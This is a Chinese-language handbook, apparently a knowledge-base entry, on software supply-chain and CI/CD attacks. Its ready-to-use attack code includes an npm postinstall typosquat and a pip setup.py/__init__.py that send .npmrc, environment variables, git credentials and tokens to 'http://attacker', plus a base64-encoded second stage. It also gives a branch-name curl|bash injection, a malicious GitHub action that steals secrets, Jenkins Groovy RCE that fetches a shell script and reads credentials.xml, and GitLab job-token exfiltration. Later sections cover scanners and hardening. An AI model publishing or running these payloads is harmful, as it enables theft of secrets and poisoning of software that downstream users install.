---
name: kb-supply-chain-cicd
description: 软件供应链与CI/CD攻击实战手册——npm/pip/Maven/Go依赖投毒(typosquatting/依赖混淆/抢注删包)、恶意包构造与社工投毒、GitHub Actions攻击(workflow注入/pull_request_target/自托管runner接管)、Jenkins/GitLab CI管道渗透、OSV-Scanner/pip-audit/grype检测审计、2024-2026真实案例与CTF靶场
tags: [供应链安全, CI/CD, 依赖投毒, GitHub Actions, 恶意包, Jenkins, GitLab, 依赖混淆, typosquatting, lockfile]
date: 2026-08-14
source: https://github.com/google/osv-scanner
---

# 软件供应链与 CI/CD 攻击实战手册

> 适用读者：Web/应用渗透熟练，已懂 AI 供应链（MCP/模型投毒），传统供应链经验空白。
> 核心心智模型：**信任链 = 源码 → 依赖解析 → 构建/CI 管道 → 制品仓库 → 部署**。攻击任一环都能污染最终产物，且"制品看着正常但含恶意代码"（ultralytics 事件已验证代码审查会失效）。
> 三大主战场：①依赖生态（投毒包）②CI 编排平台（GitHub Actions）③CI 服务端（Jenkins/GitLab）。

## 1. 依赖攻击面总览

| 生态 | 包管理器 | 安装即执行点 | 关键风险 |
|------|---------|-------------|---------|
| npm | npm/yarn/pnpm | `preinstall`/`install`/`postinstall` 脚本 | 脚本默认执行，最易投毒 |
| Python | pip/uv/poetry | `setup.py`/`pyproject.toml` 构建钩子 + `__init__.py` import 时 | 构建隔离但 `setup.py` 顶层代码会跑 |
| Maven/Gradle | mvn/gradle | `maven-antrun-plugin`、`gradle` 构建脚本 | 中央仓库无审查，私有仓库坐标可混淆 |
| Go | go mod | 无 install 钩子（相对安全） | module 代理缓存投毒、`go install` 恶意 module |

**四条必会攻击模型**：

### 1.1 Typosquatting（拼写相似包）
模仿高下载包名，利用手滑。2025 年 npm 案例：`https-proxy-utils` 仿 `https-proxy-agent`（~90M 周下载），`@acitons/artifact` 仿 `@actions/artifact`（少个 t，专打 GitHub 仓库 CI）。Python 侧 `colorinal`/`termncolor` 仿 `colorama`。

```bash
# 审计：对比官方元数据识破
npm view <pkg> name version repository homepage dist-tags
pip index versions <pkg> 2>/dev/null
# 识别特征：包龄极短、无 repo、作者邮箱一次性、下载量与名字不匹配
```

### 1.2 依赖混淆（Dependency Confusion）
**私有/内网包名被抢注到公有仓库 + 高版本号**，包管理器"取最高版本"逻辑自动选中恶意包。
- 2024 年 Google CloudImposer：Cloud Composer 用 `--extra-index-url`（私有源之外还查 PyPI），Tenable 抢注内网包名直接 RCE 进 Google 内网；2024.3 torchtriton 版本高于官方，PyTorch nightly 用户被投毒。

```bash
# 攻击方 PoC
# 1) 从目标 requirements.txt/package.json 里挖私有包名
# 2) 到 PyPI/npm 注册同名包，版本号给 999.9.9
# 3) 受害环境用了 --extra-index-url 或未锁定私有源即中招
# 防御方：--index-url 单源 / npm 私有 scope(@scope) / uv 的 --offline 优先 / 校验哈希
```

### 1.3 抢注已删包名（Pac-Man / namesquatting）
维护者删包下线 → 攻击者立即注册同名并发布恶意版本 → 用户 `npm install` 解析历史依赖时拉取恶意新版。PyPI/npm 被删包名是可枚举的（关注下载量掉零的包）。

```bash
pip index versions <pkg>            # 报错说明已删 → 可抢注
npm view <pkg> versions --json      # 空 = 可抢注
# 抢注后发布与历史同版本的恶意包（骗过 lockfile 范围解析）
```

### 1.4 原型链污染型恶意包 / lockfile 完整性
恶意包常借 `Object.prototype` 污染劫持依赖方逻辑（配合 XSS/对象合并）；`package-lock.json` 的 `resolved`+`integrity`(SRI) 是完整性锚点，若项目用 `requirements.txt`（无哈希）或未提交 lockfile 则投毒零门槛——审查 lockfile 变更 PR 时重点看新加包来源域名与 integrity。

## 2. 投毒实战手法

### 2.1 构造恶意 npm 包（install 脚本）
npm 的 `postinstall` 在 `npm install` 时自动执行，无需用户操作，是最主要的投毒通道。

```bash
mkdir lodashs && cd lodashs && npm init -y
cat > package.json <<'EOF'
{ "name": "lodashs", "version": "4.17.21",        // 仿 lodash 的 typosquat
  "scripts": { "postinstall": "node postinstall.js" } }
EOF
cat > postinstall.js <<'EOF'
const { execSync } = require('child_process');
// 无 CI 环境直接丢弃；有 CI 才动手（打 CI 秘密）
if (process.env.CI || process.env.GITHUB_ACTIONS) {
  execSync(`cat ~/.npmrc 2>/dev/null | curl -d @- http://attacker/npmrc`);   // npm token
  execSync(`env | base64 -w0 | curl -d @- http://attacker/env`);             // 全环境变量
  execSync(`cat /home/runner/work/_temp/*/git-credentials-* 2>/dev/null | curl -d @- http://attacker/git`);
}
EOF
npm publish
```
2025 年真实变体：`postinstall` 开新终端窗口跑 PyInstaller 打包的跨平台凭据窃取器（浏览器 Cookie/密码、SSH key、keyring、AWS/K8s/Docker 配置），并带假 CAPTCHA 诱导 + 4 层混淆（IIFE 自解码 → XOR → URI 编码 → 控制流混淆）。

### 2.2 构造恶意 pip 包
pip 无 install 脚本字段，但有两条等效通道：**构建期**（`setup.py` 顶层代码 / PEP 517 build hook）与**导入期**（`__init__.py`）。2025 ZiChatBot（`uuid32-utils`/`colorinal`/`termncolor`）走的是导入期：import 时释放 DLL/SO → 加载后自删 + 注册表/crontab 持久化，C2 用 Zulip 公聊 API（LoTL，免自建 C2）。

```python
# setup.py —— pip install 构建阶段直接执行（无需 import）
import os, urllib.request
try:
    urllib.request.urlopen(f"http://attacker/log?ci={os.environ.get('CI')}")
except Exception: pass
from setuptools import setup
setup(name="requests-ce", version="2.31.9", packages=["requests_ce"])
# requests_ce/__init__.py —— import 时执行（拉二阶段）
import base64, subprocess
subprocess.Popen(["python","-c", base64.b64decode("...").decode()])
```

### 2.3 社工性投毒（README 诱导 / 依赖嵌套隐藏）
- **README 钓鱼**：诱导开发者在非预期环境 `npm install -g`；**依赖嵌套隐藏**：包本体干净但依赖挂真恶意包（`termncolor`→`colorinal`），骗过"无直接危险脚本"的扫描器。
- **slopsquatting**：注册 AI 编码助手幻觉推荐的名字（PhantomRaven 126 包 / 8.6 万下载）；装包前用真实工具查证而非信 LLM 建议。

### 2.4 依赖劫持链（通过已投毒工具扩散）
tj-actions 事件展示了完整劫持链：攻击者先拿 reviewdog/action-setup（CVE-2025-30154），用它泄露的 PAT 再拿到 tj-actions/changed-files 写权限 → 重写 v1~v45 全部 tag 指向恶意 commit → 下载 gist 脚本 dump runner 进程内存（`/proc/self/memory`）→ 提取 AWS/GH token/npm token/Docker Hub/GCP 凭据 → **base64 打回公开 workflow 日志**（无需出站连接，绕过 egress 监控）。教训：**第三方 action/依赖 = 生产基础设施**，不是 YAML 字符串。

## 3. GitHub Actions 攻击

### 3.1 workflow 注入 / GITHUB_TOKEN 滥用
`${{ }}` 表达式在 shell 之前求值，PR 可控数据一旦插进 `run:` 块即 RCE（Script Injection）。
- ultralytics 事件（2024.12）：攻击者开 PR，分支名写 `openimbot:$({curl,-sSfL,...}|bash)`，`run` 块无过滤直接执行 → 拿到 secrets 与 GITHUB_TOKEN → 污染 Actions 缓存 → 发布流程从缓存恢复被改写的 wheel → 经合法的 OIDC Trusted Publishing 上 PyPI（源码树里没有恶意代码，代码审查失效）。

```bash
# 攻击方 PoC：分支名注入
git checkout -b 'refs/heads/pwn:$({curl,-sSfL,http://attacker/x.sh}|bash)'
git push origin HEAD   # 触发 pull_request / push 工作流
# GITHUB_TOKEN 提取（checkout 后存在 git 凭据里，不在 shell env）
git config --list | grep -i http\. | curl -X POST -d @- http://attacker/exfil
cat /home/runner/work/_temp/*/git-credentials-* 2>/dev/null | curl -X POST -d @- http://attacker/exfil
```

### 3.2 pull_request_target 攻击（"Pwn Request"）
`pull_request_target` 在**基础仓库上下文**运行（secrets 可用 + 默认 R/W token），且 fork PR 自动触发无需审批。一旦再 checkout fork 的 `head.sha`/`head.ref` 或执行 fork 代码，就是经典 pwn request。
- 2026 高危案例：Sherlock CVE-2026-44590（JSON 键名插进 shell → RCE + token 提取 + API 自审 PR）、Meshtastic CVE-2026-44359（CVSS 10）、QGIS CVE-2026-24480、sdkman-cli、espressif/arduino-esp32（DangerJS Dangerfile 优先级劫持）、skim-rs（Rust 执行 → 偷 App token → 打 tag 触发 release → 投毒 crates.io，影响 124 个下游 crate）。

```yaml
# 受害工作流特征（审计时找这些）
on: pull_request_target            # 高危触发器
jobs:
  build:
    permissions: contents: write   # 给 fork 代码写权限
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # 拉取攻击者代码
      - run: ./ci.sh                                      # 执行攻击者代码
```
**安全修复模板**（审计/加固用）：一律 checkout `base.ref` + `github.repository`；给外部 PR 用 `pull_request`（只读 token）→ 传 artifact → `workflow_run` 高权限处理；加 `if: github.event.pull_request.head.repo.full_name == github.repository`；`permissions:` 显式最小化。

### 3.3 secrets 窃取（恶意 action）
攻击者发布恶意 action，受害者 `uses: attacker/malicious@v1` 即中招。

```yaml
# action.yml（恶意 action 本体）
runs:
  using: composite
  steps:
    - run: |
        curl -X POST -d @- http://attacker/steal <<< "$GITHUB_TOKEN"
        curl -X POST -d @- http://attacker/steal <<< "${{ secrets.DOCKER_PASSWORD }}"
      shell: bash
```
**审计点**：workflow 里 `uses:` 第三方 action 是否 pin 到 40 位 commit SHA（而非可变 tag）；`with:` 是否把 secrets 显式传入；action 是否来自新作者/新仓库。

### 3.4 自托管 runner 接管
自托管 runner 与公网代码接触 = 一台带内网+云凭据的跳板。两种姿势：
1. **gh-hijack-runner**（synacktiv）：拿到注册 token 或先 RCE → 注册假 runner 伪装 `ubuntu-latest` 抢 job；或偷 `.credentials`/`.credentials_rsaparams`/`.runner` 三文件冒充现有 runner。
2. **Runner-on-Runner**（Gato-X）：用 `repo, workflow, gist` 范围 PAT → 通过 workflow 在非 ephemeral 自托管 runner 上开交互 shell（最长挂 5 天）。

```bash
git clone https://github.com/synacktiv/gh-hijack-runner
python gh-hijack-runner.py <registration-token> <owner/repo> --runner-label ubuntu-latest
# 审计：自托管 runner 上出现新 label / 陌生 job，检查 runner 日志
```

### 3.5 actions 供应链静态审计工具
- **zizmor**（woodruffw）：本地静态扫描 workflow 找注入/pwn request/越权 token。
- **Gato-X** / **gato**：扫描自托管 runner 枚举 + Pwn Request + runner 接管。
- **StepSecurity HackerBot/CLAW**：自动 PR 修复权限。
- 使用：`pipx install zizmor && zizmor --level=high .github/workflows/`

## 4. CI/CD 管道渗透（Jenkins / GitLab / 云 CI）

### 4.1 Jenkins 未授权 / 弱口令 / RCE
- **未授权入口探测**：先 `/whoAmI`、`/api/json`、弱口令 admin/admin 确认未授权；`/script`/`/scriptText` 无需登录即可跑任意 Groovy = 直接 RCE（2024.7 被大规模用于挖矿）。
```groovy
// GET http://target/scriptText  POST 提交
println "id".execute().text
def p = "/bin/bash -c 'curl http://attacker/s.sh|bash'".execute(); p.waitFor()
new File("/var/jenkins_home/credentials.xml").text   // 读取凭据
```
- **CVE-2024-23897**（<2.442 / <2.426.3 LTS）：CLI 参数解析 `@文件` 语法 → 任意文件读取，可读 `credentials.xml` 或借 `connect-node` 升级 RCE。
- **CVE-2024-34144**（Script Security Plugin <=1335.vf07d9ce377a_e，CVSS 9.8）：沙箱绕过 → 任意代码执行（公开 PoC 存在）。

### 4.2 构建日志 secrets 泄露
CI 日志是 secrets 泄洪道（tj-actions 就是把秘密 base64 打日志）；在日志/控制台/artifacts 里搜格式秘密，防御用日志 scrub、secret 不进 `run:` echo。
```bash
grep -iE "AKIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{36}|npm_[A-Za-z0-9]{36}|xox[baprs]-|-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY" -r .
```

### 4.3 GitLab CI 变量 / job token
- 项目/组变量（`Settings → CI/CD → Variables`）在 job 里是环境变量，拿到 job 执行权即全拿；`CI_JOB_TOKEN`/`CI_JOB_JWT` 可调 GitLab API（读仓库、触发下游 job、换云 OIDC token）。
```bash
# 恶意 job 提取
curl -d "job=$CI_JOB_TOKEN&jwt=$CI_JOB_JWT&vars=$(env | base64 -w0)" http://attacker/c
curl -H "JOB-TOKEN: $CI_JOB_TOKEN" "$CI_API_V4_URL/projects"   # API 横向
```
- **Poisoned Pipeline Execution（PPE）**：fork 仓库改 `.gitlab-ci.yml`/`Jenkinsfile` → 触发父项目管道。cider 的 CI/CD Goat 靶场整套复现了该链。

### 4.4 云 CI（GitHub Actions secrets）
secrets 只对运行它的 job 可见，审计 `uses:` 是否把顶层 secrets 传给第三方 action；加固用 environment 级 secrets + required reviewer + OIDC 替代长期 AWS/GCP 凭据（tj-actions 泄漏的教训）。

## 5. 检测与审计（防御视角）

### 5.1 漏洞扫描工具（按 lockfile/生态）
```bash
# OSV-Scanner（Google，多生态统一，基于 OSV.dev，推荐首选）
osv-scanner scan -r .                 # 递归扫目录
osv-scanner scan -L package-lock.json # 单 lockfile
osv-scanner scan --docker image:tag   # 容器镜像
osv-scanner fix                        # 引导式修复
# 各生态原生
npm audit --audit-level=high && npm ls   # Node
pip-audit -r requirements.txt -f json    # Python (PyPA)
uv audit                                 # uv.lock 原生 OSV
govulncheck ./...                        # Go
cargo audit                              # Rust
bundle audit                             # Ruby
# SBOM 路线（grype/syft）
syft dir:. -o cyclonedx-json > sbom.json
grype sbom:sbom.json --fail-on high
trivy fs . --severity CRITICAL,HIGH --ignore-unfixed
```

### 5.2 lockfile 完整性
- **必须提交 lockfile 并审查其变更 PR**：新包来源域名、`integrity`(SRI) 哈希、版本是否被悄悄降/升。
- `requirements.txt` 无哈希 → 换 `pip-tools`/`uv` 生成含 hash 的锁文件；npm 用 `npm ci`（严格按 lock）而非 `npm install`（会改 lock）。
- 镜像/构建缓存：`docker build --no-cache` 或依赖哈希固定，防缓存投毒（ultralytics 缓存污染教训）。

### 5.3 恶意包识别特征清单（手动审计时）
1. `npm view <pkg> scripts` 有 `preinstall/install/postinstall` 且非官方（npm 最高危特征）；无 repository/license、作者邮箱一次性。
2. 版本号异常高（依赖混淆信号）；或与官方版本号完全对齐（抢注删包信号）。
3. 包名与知名包高度相似（typosquat）或含 LLM 幻觉常见名（slopsquat）。
4. 代码混淆：base64、XOR、长字符串拼接、`eval`/`exec`、下载二阶段、读环境变量/git 凭据。
5. 依赖嵌套隐藏：包本体干净但依赖链上挂恶意包（ZiChatBot 的 termncolor→colorinal 模式）。
6. 运行时行为：import/install 时对外发起 HTTP、写注册表/crontab/LaunchAgents、读 `.npmrc`/`~/.aws`/keyring。

## 6. 常见坑与绕过（攻防双向）

| 坑 | 绕过/攻击 | 防御 |
|----|----------|------|
| 镜像缓存 | 恶意包残留 Docker layer，扫描器只扫最终层漏报 | 构建期重新解析依赖 + 固定哈希 + `--no-cache` 关键阶段 |
| 构建环境隔离 | 自托管 runner 与生产网络混跑，恶意 PR 直达内网 | ephemeral runner + 网络隔离 + `if:` 限内部协作者 |
| 顶层 secrets 泛滥 | 任一第三方 action 或 job 都能读 | environment 级 secrets + 最小权限 + OIDC 替代长期凭据 |
| 可变 tag 引用 action | tag 被重写即全量中毒（tj-actions 根因） | 全部 pin 40 位 commit SHA |
| `--extra-index-url` | 依赖混淆直通 | 单源 `--index-url` / npm scope / 版本 pin |
| 无 lockfile 提交 | 解析时拉新版本中招 | lockfile 入库 + 审查变更 PR + `npm ci` |
| 只扫 CVE 不扫恶意包 | 0day 恶意包无 CVE 号，SCA 全绿 | 恶意包特征清单 + Socket.dev/Phylum 类行为扫描 |

## 7. 实战靶场与资源

- **CI/CD Goat**（cider-security-research，现 Palo Alto）：Gitea+Jenkins+GitLab+LocalStack+CTFd 全套 11 挑战，覆盖 Top10 CI/CD 风险（PPE、依赖链滥用、PBAC）。`docker compose up -d`，`http://localhost:8000` alice/alice。
- **OWASP WrongSecrets**：secrets 管理攻防训练。
- **Sherlock CVE-2026-44590 PoC**（Astaruf）：自带 `poc.py` 自动 fork → 触发 workflow → 提 token → 自审 PR，pwn request 全链路教材。
- **gh-hijack-runner** / **Gato-X** / **zizmor**：runner 接管 + workflow 静态审计实战工具。

**2024-2026 必读真实案例**：tj-actions CVE-2025-30066（tag 重写 + 内存 dump + 日志外带）、ultralytics 2024.12（pwn request + 缓存污染 + 未吊销 PyPI token）、CloudImposer GCP 2024（依赖混淆 RCE）、PyPI ZiChatBot 2025（LoTL 用 Zulip 当 C2）、npm PhantomRaven 2025（slopsquatting 126 包）。

## Sources

- **tj-actions CVE-2025-30066**: [safeguard.sh](https://safeguard.sh/resources/blog/tj-actions-compromise-one-year-retrospective) · [OSV GHSA](https://osv.dev/vulnerability/GHSA-mrrh-fwg8-r2c3) · [Oasis](https://www.oasis.security/blog/tj-actions)
- **PyPI ZiChatBot 2025**: [THN](https://thehackernews.com/2026/05/pypi-packages-deliver-zichatbot-malware.html) · [Kaspersky](https://securelist.com/oceanlotus-suspected-pypi-zichatbot-campaign/119603/)
- **npm typosquat 2025**: [Socket 10 包](https://socket.dev/blog/10-npm-typosquatted-packages-deploy-credential-harvester) · [Veracode @acitons](https://www.veracode.com/blog/malicious-npm-package-targeting-github-actions/) · [AdaptixC2](https://www.sourcetrail.com/javascript/kaspersky-finds-adaptixc2-spread-via-npm-typosquatting/)
- **pwn request**: [Orca](https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/) · [JFrog](https://research.jfrog.com/post/part-1-pull-request-target-exploitation/) · [Sherlock GHSA](https://github.com/sherlock-project/sherlock/security/advisories/GHSA-v6wr-ccr4-x8g9) · [PoC](https://github.com/Astaruf/CVE-2026-44590) · [Meshtastic CVE-2026-44359](https://nvd.nist.gov/vuln/detail/CVE-2026-44359) · [arduino-esp32 DangerJS](https://github.com/espressif/arduino-esp32/security/advisories/GHSA-rhcj-7qrh-rrwh)
- **Ultralytics 2024.12**: [PyPI blog 分析](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/)
- **依赖混淆 CloudImposer**: [SecurityWeek](https://www.securityweek.com/dependency-confusion-could-have-led-to-rce-in-google-cloud-platform/) · [THN](https://thehackernews.com/2024/09/google-fixes-gcp-composer-flaw-that.html)
- **Jenkins**: [THN Script Console 挖矿](https://thehackernews.com/2024/07/hackers-exploiting-jenkins-script.html) · [pwn_jenkins RCE](https://deepwiki.com/gquere/pwn_jenkins/2-remote-code-execution-(rce)-techniques)
- **工具**: [OSV-Scanner](https://github.com/google/osv-scanner) · [支持 lockfile](https://github.com/google/osv-scanner/blob/main/docs/supported_languages_and_lockfiles.md) · [SCA 工具测评](https://safeguard.sh/resources/blog/best-open-source-sca-tools-in-2026-tested-on-a-real-monorepo)
- **runner 接管/审计**: [gh-hijack-runner](https://github.com/synacktiv/gh-hijack-runner) · [Gato-X](https://github.com/AdnaneKhan/Gato-X)
- **靶场**: [cicd-goat](https://github.com/cider-security-research/cicd-goat)
